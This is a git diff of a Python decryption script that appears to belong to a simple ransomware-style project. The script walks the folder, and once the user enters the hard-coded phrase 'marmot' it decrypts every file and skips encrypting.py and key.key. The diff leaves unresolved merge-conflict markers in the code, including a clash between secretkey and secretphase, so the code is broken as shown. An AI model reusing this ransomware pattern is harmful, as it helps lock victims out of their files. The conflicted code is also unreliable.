@@ -12,6 +12,10 @@ All_files = []
 for root, dirs, files in os.walk("."):
     for file in files:
         path = os.path.join(root,file)
+<<<<<<< HEAD
+=======
+        dirs[:] = [d for d in dirs if d != ".git"]
+>>>>>>> 85c47c2 (Initial commit - prevent double encryption)
         
         if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
             continue
@@ -28,7 +32,13 @@ secretphase = "marmot"
 
 user_phase = input("Enter secret phase to decrypt the files!\n")
 
+<<<<<<< HEAD
 if(secretkey == user_phase):
+=======
+if secretphase == user_phase:
+
+
+>>>>>>> 85c47c2 (Initial commit - prevent double encryption)
 
     for file in All_files:
         with open(file, "rb") as thefile:
@@ -39,10 +49,17 @@ if(secretkey == user_phase):
         with open(file, "wb") as thefile:
             thefile.write(content_decrypted)
 
+<<<<<<< HEAD
     root = tk.Tk()
     root.withdraw()
 
     messagebox.showinfo("Your data is decrypted!", "Good Job")
+=======
+    # root = tk.Tk()
+    # root.withdraw()
+
+    # messagebox.showinfo("Your data is decrypted!", "Good Job")
+>>>>>>> 85c47c2 (Initial commit - prevent double encryption)
 
 else: 
     root = tk.Tk()
